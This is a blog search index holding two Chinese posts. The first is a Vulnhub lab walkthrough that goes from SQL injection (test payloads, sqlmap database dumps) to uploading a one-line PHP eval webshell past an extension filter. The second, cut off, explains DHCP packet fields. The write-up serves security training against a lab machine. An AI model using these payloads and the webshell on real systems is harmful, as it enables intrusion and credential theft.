<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub靶机实战：from_sqli_to_shell_i386</title>
      <link href="/posts/3f12.html"/>
      <url>/posts/3f12.html</url>
      
        <content type="html"><![CDATA[<h2 id="靶机官网："><a href="#靶机官网：" class="headerlink" title="靶机官网："></a>靶机官网：</h2><p><a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/" title="https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;pentester-lab-from-sql-injection-to-shell,80&#x2F;">https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell,80/</a></p><h2 id="靶机镜像ISO下载地址：（转链）"><a href="#靶机镜像ISO下载地址：（转链）" class="headerlink" title="靶机镜像ISO下载地址：（转链）"></a>靶机镜像ISO下载地址：（转链）</h2><p><a href="http://4275.com/anqxun" title="from_sqli_to_shell_i386.iso - 4275.COM">from_sqli_to_shell_i386.iso - 4275.COM</a></p><hr><h2 id="一、启动靶机"><a href="#一、启动靶机" class="headerlink" title="一、启动靶机"></a>一、启动靶机</h2><p><img src="https://i-blog.csdnimg.cn/direct/5a4fd41092d44bbe818c8cdde4365ebb.png"><br><img src="https://i-blog.csdnimg.cn/direct/6cc6781b117d4d0fb19c9b5dcaafe880.png"><br><img src="https://i-blog.csdnimg.cn/direct/e494819a888c4997bb06a236b9141496.png"></p><hr><h2 id="二、查找靶机-IP-地址（2种方法）"><a href="#二、查找靶机-IP-地址（2种方法）" class="headerlink" title="二、查找靶机 IP 地址（2种方法）"></a><strong>二、查找靶机 IP 地址（2种方法）</strong></h2><h3 id="1-使用-netdiscover-命令："><a href="#1-使用-netdiscover-命令：" class="headerlink" title="1.使用 netdiscover 命令："></a><strong>1.使用 netdiscover 命令</strong>：</h3><p>在 Kali 终端中，输入 netdiscover 命令，该命令会自动扫描局域网内的活跃主机，尝试查找靶机的 IP 地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/a9d3d3ed58f44b479b0bcf8603aec8f5.png"></p><h3 id="2-使用-arp-scan-命令："><a href="#2-使用-arp-scan-命令：" class="headerlink" title="2.使用 arp - scan 命令："></a><strong>2.使用 arp - scan 命令</strong>：</h3><p>执行 arp - scan - l - D 命令，对同网段下的主机进行扫描。此命令通过发送 ARP 请求并接收响应，来获取局域网内设备的 IP 地址和 MAC 地址信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -D</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/028deb31268a473e80680f8203de2229.png"></p><hr><h2 id="三、端口扫描与服务探测"><a href="#三、端口扫描与服务探测" class="headerlink" title="三、端口扫描与服务探测"></a>三、端口扫描与服务探测</h2><h3 id="1-全端口扫描："><a href="#1-全端口扫描：" class="headerlink" title="1.全端口扫描："></a><strong>1.全端口扫描</strong>：</h3><p>nmap –min - rate 10000 - p - 192.168.16.132 命令对靶机进行全端口扫描。该命令以较高的扫描速率（每分钟至少 10000 个数据包）探测靶机上开放的所有 TCP 端口。扫描结果显示，靶机开放了 22 端口（SSH 服务）和 80 端口（HTTP 服务）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min - rate 10000 - p - 192.168.16.132</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/8d63dc54dd6245398acf36e1675623aa.png"></p><h3 id="2-对80端口详细扫描："><a href="#2-对80端口详细扫描：" class="headerlink" title="2.对80端口详细扫描："></a><strong>2.对80端口详细扫描</strong>：</h3><p>针对开放的 80 端口，执行 nmap - sT - sC - sV - O - p80 192.168.16.132 命令。此命令在进行 TCP 连接扫描（-sT）的同时，还会运行一系列默认脚本（-sC）来检测常见的漏洞和服务信息，获取服务版本（-sV）以及尝试识别靶机操作系统（-O）。扫描结果表明，80 端口运行的是 Apache httpd 2.2.16 版本（基于 Debian 系统），操作系统为 Linux，内核版本在 2.6.32 - 2.6.35 之间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap - sT - sC - sV - O - p80 192.168.16.132</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/9472523c21304c06a2331a2825c95ce3.png"></p><hr><h2 id="四、浏览器访问靶机-IP"><a href="#四、浏览器访问靶机-IP" class="headerlink" title="四、浏览器访问靶机 IP"></a>四、浏览器访问靶机 IP</h2><p>在确定靶机开放 80 端口且运行着 Web 服务后，我们在浏览器中输入靶机 IP 地址 192.168.16.132 进行访问。打开页面后，呈现出一个名为 “My Awesome Photoblog” 的网站，页面展示了一些图片相关的内容，如 “last picture: cthulhu” 等信息，同时右侧有 “Admin” 选项卡。</p><p><img src="https://i-blog.csdnimg.cn/direct/66fa776a96684e1cafe5c5e61384a170.png"></p><hr><h2 id="五、寻找sql注入漏洞（2种方法）"><a href="#五、寻找sql注入漏洞（2种方法）" class="headerlink" title="五、寻找sql注入漏洞（2种方法）"></a>五、寻找sql注入漏洞（2种方法）</h2><h3 id="1-nmap漏洞脚本扫描"><a href="#1-nmap漏洞脚本扫描" class="headerlink" title="1.nmap漏洞脚本扫描"></a>1.nmap漏洞脚本扫描</h3><p>使用 nmap –script &#x3D; vuln - p80 192.168.16.132 命令尝试利用 nmap 的漏洞脚本扫描 80 端口的漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script = vuln - p80 192.168.16.132 </span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/9add5ece33754d769586afe42cf7388b.png"></p><p>发现了了大量的SQL注入点：</p><blockquote><p>| http-sql-injection: <br>|   Possible sqli for queries:<br>|     <a href="http://192.168.16.132/cat.php?id=2%27%20OR%20sqlspider">http://192.168.16.132:80/cat.php?id=2%27%20OR%20sqlspider</a><br>|     <a href="http://192.168.16.132/cat.php?id=1%27%20OR%20sqlspider">http://192.168.16.132:80/cat.php?id=1%27%20OR%20sqlspider</a><br>|     <a href="http://192.168.16.132/cat.php?id=3%27%20OR%20sqlspider">http://192.168.16.132:80/cat.php?id=3%27%20OR%20sqlspider</a></p></blockquote><h3 id="2-从页面url中id参数下手，找sql注入点"><a href="#2-从页面url中id参数下手，找sql注入点" class="headerlink" title="2.从页面url中id参数下手，找sql注入点"></a>2.从页面url中id参数下手，找sql注入点</h3><h4 id="（1）发现登录Admin后台界面与潜在-SQL-注入漏洞"><a href="#（1）发现登录Admin后台界面与潜在-SQL-注入漏洞" class="headerlink" title="（1）发现登录Admin后台界面与潜在 SQL 注入漏洞"></a>（1）发现登录Admin后台界面与潜在 SQL 注入漏洞</h4><p>点击 <strong>“Admin”</strong> 选项卡后，进入到一个后台管理的登录界面。</p><p>为了登录成功，我们需要找到有效的用户名和密码。</p><p><img src="https://i-blog.csdnimg.cn/direct/e87b7ff04abc4b388ca6682b35b7016e.png"></p><p>在对网站进行初步探索时，我们点击了右侧的各个选项卡，并观察每个页面的 URL。</p><p><img src="https://i-blog.csdnimg.cn/direct/8150c267ab1e4e6984287e29c991d99a.png"><br><img src="https://i-blog.csdnimg.cn/direct/efdaf577fae0466885e0c653ea7beb99.png"><br><img src="https://i-blog.csdnimg.cn/direct/def78060ff0341c190a44f86094a8e71.png"></p><p>发现多个页面都是通过 GET 方式将<strong>参数 id</strong> 传递给 <strong>cat.php 文件</strong>来获取不同的内容，例如访问 <strong>192.168.16.132&#x2F;cat.php?id &#x3D; 1</strong>、<strong>192.168.16.132&#x2F;cat.php?id &#x3D; 2</strong> 等不同的 id 值会返回不同的图片信息。这种动态参数传递的方式存在 SQL 注入的可能性，因为攻击者可能通过构造恶意的 id 参数值来篡改数据库查询逻辑。</p><h4 id="（2）确定-SQL-注入点"><a href="#（2）确定-SQL-注入点" class="headerlink" title="（2）确定 SQL 注入点"></a>（2）确定 SQL 注入点</h4><p>为了验证 SQL 注入点的存在，我们使用万能测试语句 “<strong>or 1 &#x3D; 1#</strong>” 进行测试。将其添加到 URL 参数中，即访问 <strong>192.168.16.132&#x2F;cat.php?id &#x3D; 1 or 1 &#x3D; 1#</strong>。</p><p><img src="https://i-blog.csdnimg.cn/direct/713440dcc48f4786b37721db5291443e.png"></p><p>经过测试，页面内容发生改变且符合预期，显示了更多的图片信息，这表明成功找到了 SQL 注入点。</p><hr><h2 id="六、SQL-注入漏洞利用与信息获取"><a href="#六、SQL-注入漏洞利用与信息获取" class="headerlink" title="六、SQL 注入漏洞利用与信息获取"></a>六、SQL 注入漏洞利用与信息获取</h2><h4 id="1-使用-sqlmap-扫描数据库"><a href="#1-使用-sqlmap-扫描数据库" class="headerlink" title="1.使用 sqlmap 扫描数据库"></a>1.使用 sqlmap 扫描数据库</h4><p>确定注入点后，我们借助强大的 sqlmap 工具来进一步探索数据库信息。</p><p>执行下面命令（2选一）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap - u <span class="string">&quot;http://192.168.16.132/cat.php?id = 1&quot;</span> --dbs --batch​</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.16.132:80/cat.php?id=2%27%20OR%20sqlspider&quot;</span> -dbs</span><br></pre></td></tr></table></figure><p>会自动检测并利用注入点，尝试获取数据库列表。</p><p><img src="https://i-blog.csdnimg.cn/direct/5f226a93edea46df82dddcf05fbe9e3b.png"></p><blockquote><p><strong>fetching database names：</strong></p><p><strong>available databases [2]:<br>[*] information_schema<br>[*] photoblog</strong></p></blockquote><p>扫描结果显示靶机存在两个数据库，分别是 information_schema（MySQL 系统数据库，用于存储数据库元数据信息）和 photoblog（该摄影博客网站应用所使用的数据库）。</p><h4 id="2-爆破-photoblog-数据库中的表"><a href="#2-爆破-photoblog-数据库中的表" class="headerlink" title="2.爆破 photoblog 数据库中的表"></a>2.爆破 photoblog 数据库中的表</h4><p>接着，我们对 photoblog 数据库中的表进行爆破。使用 sqlmap - u “<a href="http://192.168.16.132/cat.php?id" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;cat.php?id">http://192.168.16.132/cat.php?id</a> &#x3D; 1” - D photoblog –tables –batch 命令，sqlmap 将尝试获取 photoblog 数据库中的所有表名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​sqlmap - u <span class="string">&quot;http://192.168.16.132/cat.php?id = 1&quot;</span> - D photoblog --tables --batch</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/347ac3dc32ba43a6b75de3dd195b0502.png">经过一段时间的扫描，成功获取到三个表名：categories（可能用于存储图片分类信息）、pictures（可能存储图片相关数据）和 users（推测用于存储用户信息）。</p><h4 id="3-获取-users-表的字段名"><a href="#3-获取-users-表的字段名" class="headerlink" title="3.获取 users 表的字段名"></a>3.获取 users 表的字段名</h4><p>进一步深入，我们需要获取 users 表中的字段名。执行 sqlmap - u “<a href="http://192.168.16.132/cat.php?id" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;cat.php?id">http://192.168.16.132/cat.php?id</a> &#x3D; 1” - D photoblog - T users –columns –batch 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​sqlmap - u <span class="string">&quot;http://192.168.16.132/cat.php?id = 1&quot;</span> - D photoblog - T <span class="built_in">users</span> --columns --batch</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/164c15a9c6114bf9a6ea8f50f1fc4a82.png"></p><p>sqlmap 成功获取到 users 表中的三个字段：id（数据类型为 mediumint (9)，可能是用户 ID）、login（varchar (50)，推测为用户名）和 password（varchar (50)，显然是用户密码）。</p><h4 id="4-获取-users-表中的用户数据"><a href="#4-获取-users-表中的用户数据" class="headerlink" title="4.获取 users 表中的用户数据"></a>4.获取 users 表中的用户数据</h4><p>最后，我们使用 sqlmap - u “<a href="http://192.168.16.132/cat.php?id" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;cat.php?id">http://192.168.16.132/cat.php?id</a> &#x3D; 1” - D photoblog - T users - C id,login,password –dump –batch 命令来获取 users 表中这些字段的具体文本内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​sqlmap - u <span class="string">&quot;http://192.168.16.132/cat.php?id = 1&quot;</span> - D photoblog - T <span class="built_in">users</span> - C <span class="built_in">id</span>,login,password --dump --batch</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/4cf67927b7a34777872967177f29cc12.png"></p><p>经过爆破，我们成功获取到一条用户记录，其中用户名是 “admin”，密码的 MD5 值为 “8efe310f9ab3efeae8d410a8e0166eb2”。幸运的是，sqlmap 直接为我们解密了密码的 MD5 值，得到密码为 “P4ssw0rd”。</p><h4 id="5-登录后台管理系统"><a href="#5-登录后台管理系统" class="headerlink" title="5.登录后台管理系统"></a>5.登录后台管理系统</h4><p>有了用户名和密码，我们返回登录界面，输入 “admin” 和 “P4ssw0rd” 进行登录。</p><p><img src="https://i-blog.csdnimg.cn/direct/5b096e2df86c42d7aeeedaf12dba7069.png"></p><p><img src="https://i-blog.csdnimg.cn/direct/d88cd24f4ba5401dbf035b88784cefdc.png"></p><p>登录成功后，进入到后台管理页面，页面显示了图片管理相关的功能，包括查看图片、删除图片以及添加新图片等操作。</p><p><img src="https://i-blog.csdnimg.cn/direct/92fdfa7620e14430ae8ca1911eca0d42.png"></p><p>这个表是一个图片表，名称是一个herf，可以直接查看，后面的delete应该也是可以删除这张图片</p><hr><h2 id="七、文件上传漏洞利用与获取-Shell"><a href="#七、文件上传漏洞利用与获取-Shell" class="headerlink" title="七、文件上传漏洞利用与获取 Shell"></a>七、文件上传漏洞利用与获取 Shell</h2><h3 id="1-文件上传功能测试"><a href="#1-文件上传功能测试" class="headerlink" title="1.文件上传功能测试"></a>1.文件上传功能测试</h3><p><img src="https://i-blog.csdnimg.cn/direct/7106535805a641efacef2e4b060c9a15.png"><img src="https://i-blog.csdnimg.cn/direct/77278cb7555b47638cea7ce653c255af.png"></p><p>在后台管理页面中，我们注意到 “Add a new picture” 按钮，点击后发现可以上传文件。这意味着着可能存在通过文件上传功能获取更高权限的途径，例如上传恶意文件（如病毒木马）来控制靶机。</p><h3 id="2-上传-PHP-文件失败"><a href="#2-上传-PHP-文件失败" class="headerlink" title="2.上传 PHP 文件失败"></a>2.上传 PHP 文件失败</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;webshell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/351f943a9050477ea6e279afb7170f87.png"></p><p>在 Kali 系统中，我们创建一个包含一句话木马的 PHP 文件（命名为abc.php），尝试通过文件上传功能将其上传到靶机。</p><p><img src="https://i-blog.csdnimg.cn/direct/78d6966bd7c5487cb569102d0727ae0f.png"></p><p>、然而，上传失败！靶机显示 “No PHP!!”，这表明靶机对上传的文件进行了过滤，禁止直接上传 PHP 文件。</p><h3 id="3-绕过文件上传过滤"><a href="#3-绕过文件上传过滤" class="headerlink" title="3.绕过文件上传过滤"></a>3.绕过文件上传过滤</h3><p>经过初步分析，猜测靶机是通过检测文件后缀名来过滤上传文件的，即禁止上传后缀名为**.php** 的文件。为了绕过这个限制，我们将 PHP 文件的后缀名由原来的**.php<strong>修改为</strong>.Php**，然后再次尝试上传。</p><p><img src="https://i-blog.csdnimg.cn/direct/5f776f36ad1e4c87a81632b754c91474.png"><img src="https://i-blog.csdnimg.cn/direct/71cb63f262104c898f45e52de7376a75.png"></p><p>这次上传成功了，这进一步证实了我们的猜测，即靶机的上传检测机制仅针对文件后缀名，而未对文件内容进行检测。</p><h3 id="4-寻找上传文件的存储位置"><a href="#4-寻找上传文件的存储位置" class="headerlink" title="4.寻找上传文件的存储位置"></a>4.寻找上传文件的存储位置</h3><p>虽然上传的文件（伪装成.Php格式）成功上传到了靶机，但由于其实际上是一个 PHP 文件，我们需要找到一种方法使其能够被服务器解析为 PHP 脚本，从而执行我们的木马代码。</p><p>为此，我们使用 dirb 命令扫描网站后台目录，希望找到上传文件的存储位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​dirb http://192.168.16.132</span><br></pre></td></tr></table></figure><p>执行 dirb <a href="http://192.168.16.132/" title="http:&#x2F;&#x2F;192.168.16.132">http://192.168.16.132</a>命令后，我们发现了一个名为 “uploads” 的目录，根据其名称和网站的逻辑，我们推测上传的文件很可能保存在这个目录中</p><p><img src="https://i-blog.csdnimg.cn/direct/397a1168e70941af868eacd6eebb87a7.png"></p><h3 id="5-确认上传文件的访问路径"><a href="#5-确认上传文件的访问路径" class="headerlink" title="5.确认上传文件的访问路径"></a>5.确认上传文件的访问路径</h3><h4 id="（1）查找上传文件的保存目录"><a href="#（1）查找上传文件的保存目录" class="headerlink" title="（1）查找上传文件的保存目录"></a>（1）查找上传文件的保存目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​dirb http://192.168.16.132/admin/uploads - w</span><br></pre></td></tr></table></figure><p>为了验证我们的推测，我们使用 dirb 命令再次查看指定目录，执行 dirb <a href="http://192.168.16.132/admin/uploads" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;admin&#x2F;uploads">http://192.168.16.132/admin/uploads</a> - w 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​dirb http://192.168.16.132/admin/uploads - w</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/a9353e6c9bec445aa15e9619294a5da9.png"></p><h4 id="（2）通过后缀名-Php来验证文件保存位置"><a href="#（2）通过后缀名-Php来验证文件保存位置" class="headerlink" title="（2）通过后缀名.Php来验证文件保存位置"></a>（2）通过后缀名.Php来验证文件保存位置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​dirb http://192.168.16.132/admin/uploads - w -X .Php</span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/direct/349f1c7cd20349f2940704569226158f.png"></p><p>从扫描结果中，我们成功找到了我们上传的文件 “abc.Php”。并且发现其访问路径为<a href="http://192.168.16.132/admin/uploads/webshell.Php" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;admin&#x2F;uploads&#x2F;abc.Php">http://192.168.16.132/admin/uploads/abc.Php</a>。</p><h3 id="6-访问上传文件并获取-Shell"><a href="#6-访问上传文件并获取-Shell" class="headerlink" title="6.访问上传文件并获取 Shell"></a>6.访问上传文件并获取 Shell</h3><p> <img src="https://i-blog.csdnimg.cn/direct/9c0176b263054c4f9630e6bde7c346b6.png"></p><p>在浏览器中访问<a href="http://192.168.16.132/admin/uploads/webshell.Php" title="http:&#x2F;&#x2F;192.168.16.132&#x2F;admin&#x2F;uploads&#x2F;abc.Php">http://192.168.16.132/admin/uploads/abc.Php</a>，如果一切顺利，我们的一句话木马将被执行，此时我们可以使用工具（如中国蚁剑或其他类似的 WebShell 管理工具）连接到这个地址，通过在工具中输入密码（这里是 “cmd”，与我们在一句话木马中设置的密码一致），成功连接后，我们就获取了靶机的 Shell 权限，可以在靶机上执行各种命令，进一步深入探索靶机系统，完成渗透测试的目标。</p><hr>]]></content>
      
      
      <categories>
          
          <category> Vulnhub靶机实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
            <tag> Sqlmap </tag>
            
            <tag> nmap </tag>
            
            <tag> from_sqli_to_shell_i386 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark抓包分析理解DHCP协议及工作流程</title>
      <link href="/posts/55b4.html"/>
      <url>/posts/55b4.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、DHCP简介"><a href="#一、DHCP简介" class="headerlink" title="一、DHCP简介"></a>一、DHCP简介</h2><blockquote><p><code>DHCP（Dynamic Host Configuration Protocol）</code>动态主机配置协议，前身是BOOTP协议。在大型局域网中，需要给很多主机配置地址信息，如果采用传统手工配置（累死），效率太低，因此采用此协议可以很方便的给主机配置各种地址信息，例如IP地址，SubMask、网关地址、DNS等等。</p></blockquote><blockquote><p>下面进行简单介绍，下面所述中<code>Client值得就是DHCP Client，Server指的是DHCP Server</code>。</p></blockquote><hr><h3 id="1-DHCP协议理解"><a href="#1-DHCP协议理解" class="headerlink" title="(1)DHCP协议理解"></a>(1)DHCP协议理解</h3><ul><li><code>定义：</code>DHCP：Dynamic Host Configuration Protocol，动态主机配置协议，是一个应用在局域网中的网络协议，它使用UDP协议工作。</li><li><code>理解：</code>DHCP协议就是一个基于UDP协议工作在局域网内的网络协议，其最终的目的就是获取响应的IP地址，其中这过程中有多种分配方式，以及发送报文的格式要求等。</li><li><code>作用：</code>动态分配IP地址，过程自动化，终端无需一一手工配置，配置信息统一管理（DNS,网关），IP地址有限、需要大量配置IP地址、经常移动终端。</li><li><code>好处：</code>提高配置IP地址效率，减少配置工作量，减少IP地址冲突。</li><li><code>分配IP地址方式：</code><ul><li><code>（1）手工配置方式：</code>通过网络管理员手工配置某台客户端特定的IP地址，当客户端请求分配时，DHCP服务器就将手动配置的IP地址分配给客户端。。</li><li><code>（2）自动配置方式：</code>当DHCP客户端第一次想服务端租用到第一个IP地址后，就将这个IP地址永久分配给客户端使用。</li><li><code>（3）动态配置方式：</code>服务器暂时分配一个IP地址给客户端，根据租约到期或者续约租期的方式来管理分配的IP地址。</li></ul></li></ul><hr><h3 id="2-DHCP报文格式"><a href="#2-DHCP报文格式" class="headerlink" title="(2)DHCP报文格式"></a>(2)DHCP报文格式</h3><h3 id="2-1-DHCP报文封装格式"><a href="#2-1-DHCP报文封装格式" class="headerlink" title="2.1 DHCP报文封装格式"></a>2.1 DHCP报文封装格式</h3><table><thead><tr><th>表头</th></tr></thead><tbody><tr><td><code>DHCP报文封装格式</code></td></tr><tr><td></td></tr></tbody></table><blockquote><p><code>链路层头</code></p></blockquote><p> | </p><blockquote><p><code>IP头  20bytes</code></p></blockquote><p> | </p><blockquote><p><code>UDP头</code></p></blockquote><p> | </p><blockquote><p><code>DHCP报文</code></p></blockquote><p> |</p><hr><h3 id="2-2-DHCP报文格式"><a href="#2-2-DHCP报文格式" class="headerlink" title="2.2 DHCP报文格式"></a>2.2 DHCP报文格式</h3><blockquote><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240626083301811-829038666.png"></p></blockquote><ul><li><code>op：</code>1byte,是报文的操作类型，分为请求报文和响应报文，1为请求报文；2为响应报文。具体的报文类型在option字段中标识。</li><li><code>htype：</code>1byte,表示client硬件地址的类型，1表示以太网类型。</li><li><code>hlen：</code>1byte，硬件地址的长度，以太网的硬件地址长度为6bytes。</li><li><code>hops：</code>1byte，表示当前dhcp报文经过的DHCP中继的数目，每经过一个DHCP中继这个字段就加1.</li><li><code>xid：</code>4bytes，由client端产生的随机数，用于匹配请求和应答报文，就是匹配应答报文是对哪个请求报文做出应答。</li><li><code>secs：</code>2bytes，客户端进入IP地址申请进程的时间或者更新IP地址进程的时间；由客户端软件根据情况设定。目前没有使用，固定为0。</li><li><code>flags：</code>2bytes，是标志字段，16比特中只使用了最高位比特（即最左边的比特），<code>这个个比特是广播响应标识位，用来标识DHCP服务器发出的响应报文是广播还是单播，0是单播，1是广播</code>。其余的比特位保留不用，都为0。</li><li><code>ciaddr：</code>4bytes，是客户端的IP地址，可以是client自己的IP地址，也可以是server分配给client的IP地址。</li><li><code>yiaddr(Your IP Address)：</code>4bytes，是<code>server分配给client的IP地址</code>。</li><li><code>siaddr：</code>4bytes，是client端获取IP地址等信息的<code>server端的地址</code>。</li><li><code>giaddr：</code>4bytes，是client发出请求报文后经过的第一个中继的IP地址。</li><li><code>chaddr：</code>16bytes，是<code>client端的硬件地址</code>，在client发出报文时会把自己<code>网卡的硬件地址</code>写进这个字段。</li><li><code>sname：</code>64bytes，服务器主机名，是client端获取IP地址等信息的服务器名称。</li><li><code>file：</code>128bytes，是client的启动配置文件名，是服务器为client指定的启动配置文件名及路径信息，由服务器填写。</li><li><code>options</code>：是可选变长的选项字段，这个字段包含了<code>终端的初始配置信息和网络配置信息，包括报文类型，有效租期，DNS服务器的IP地址等配置信息</code>。</li></ul><blockquote><p>Options字段有很多项，是可选的，不同的报文option项可能不同。</p></blockquote><blockquote><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240626084809766-1692041272.png"></p></blockquote><blockquote><p>不同的option项有不同的含义，下面是一些常见的option项：</p></blockquote><ul><li><code>DHCP Message Type：</code>表示DHCP的报文类型。</li><li><code>Client identifier:</code>   client端的硬件地址</li><li><code>Server identifier:</code>  服务器的IP地址</li><li><code>Subnet Mask:</code>  子网掩码</li><li><code>route:</code>  网关IP地址</li><li><code>Domain Name Server:</code> DNS服务器的IP地址</li><li><code>IP Address Lease Time:</code> 租约时间</li></ul><hr><h3 id="3-DHCP报文的种类"><a href="#3-DHCP报文的种类" class="headerlink" title="(3)DHCP报文的种类"></a>(3)DHCP报文的种类</h3><blockquote><p>Dhcp协议一共有8种报文，包括：<code>DHCP Dsicover</code>，<code>DHCP Offer</code>，<code>DHCP Request</code>，<code>DHCP ACK</code>，<code>DHCP NAK</code>，<code>DHCP Release</code>，<code>DHCP Decline</code>，<code>DHCP Inform</code>。</p></blockquote><blockquote><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240626082426661-1141126169.png"></p></blockquote><blockquote><p>报文类型由options字段中的<code>option53DHCP Message Type</code>选项来确定。各报文的具体含义如下：</p></blockquote><blockquote><p><code>1.DHCP Dsicover</code>报文：0x01  客户端请求包</p></blockquote><blockquote><p>这个报文是client端开始dhcp过程的第一个请求报文，client在请求地址时，并不知道server端的位置，所以client会以广播的方式发送请求报文，它的目的是发现网络中的服务器。</p></blockquote><h3 id="2-DHCP-Offer报文：-0x02-服务器响应包"><a href="#2-DHCP-Offer报文：-0x02-服务器响应包" class="headerlink" title="2.DHCP Offer报文： 0x02  服务器响应包"></a><code>2.DHCP Offer</code>报文： 0x02  服务器响应包</h3><blockquote><p>这个报文server端对DISCOVERY报文的响应报文。会在所配置的地址池中查找一个合适的IP地址，加上相应的租约期限和其他配置信息（如GATEWAY，DNS SERVER等），构造一个OFFER报文，发送给用户，告知用户本SERVER可以为其提供IP地址的分配，并且。发OFFER报文一般是单播的方式发送。</p></blockquote><h3 id="3-DHCP-Request报文：0x03-客户端选择包"><a href="#3-DHCP-Request报文：0x03-客户端选择包" class="headerlink" title="3.DHCP Request报文：0x03 客户端选择包"></a>3.<code>DHCP Request</code>报文：0x03 客户端选择包</h3><blockquote><p>在一个子网中可能有多台服务器，所有收到DISCOVER报文的服务器都会回应OFFER报文，所以client端可能收到多个OFFER报文，通常会选择第一个OFFER报文的服务器作为自己的目标服务器，并回应一个REQUEST请求报文。在续租约的时候client端也会发送REQUEST报文  请求续租期。</p></blockquote><h3 id="4-DHCP-ACK报文：0x05-服务器确认包"><a href="#4-DHCP-ACK报文：0x05-服务器确认包" class="headerlink" title="4.DHCP ACK报文：0x05  服务器确认包"></a>4.<code>DHCP ACK</code>报文：0x05  服务器确认包</h3><blockquote><p>是server对client端的REQUEST报文的确认响应报文，server在收到REQUEST报文后，根据REQUEST报文中携带的client MAC来查找有没有相应的租约记录，如果有则发送ACK报文作为回应，通知client可以使用分配的IP地址。</p></blockquote><h3 id="5-DHCP-NAK报文：0x06-服务器拒绝包"><a href="#5-DHCP-NAK报文：0x06-服务器拒绝包" class="headerlink" title="5.DHCP NAK报文：0x06  服务器拒绝包"></a>5.<code>DHCP NAK</code>报文：0x06  服务器拒绝包</h3><blockquote><p>Server端对client端的REQUEST报文的拒绝响应报文，如果服务器没有相应的租约记录，就会发送NAK报文给client端。</p></blockquote><h3 id="6-DHCP-Release报文：0x07-客户端释放包"><a href="#6-DHCP-Release报文：0x07-客户端释放包" class="headerlink" title="6.DHCP Release报文：0x07  客户端释放包"></a>6.<code>DHCP Release</code>报文：0x07  客户端释放包</h3><blockquote><p>Client端主动释放server端分配给它的IP是，就会发送DHCP-RELEASE报文给server，server收到这个报文后，就会回收这个IP地址。</p></blockquote><h3 id="7-DHCP-Decline：0x04"><a href="#7-DHCP-Decline：0x04" class="headerlink" title="7.DHCP Decline：0x04"></a>7.<code>DHCP Decline</code>：0x04</h3><blockquote><p>client收到server回应的ACK报文后，通过地址冲突检测发现 SERVER分配的地址冲突或由于其它原因导致不能使用，则发送DHCP-DECLINE报文，通知server所分配的IP地址不可用。</p></blockquote><h3 id="8-DHCP-Inform报文：0x08"><a href="#8-DHCP-Inform报文：0x08" class="headerlink" title="8.DHCP Inform报文：0x08"></a>8.<code>DHCP 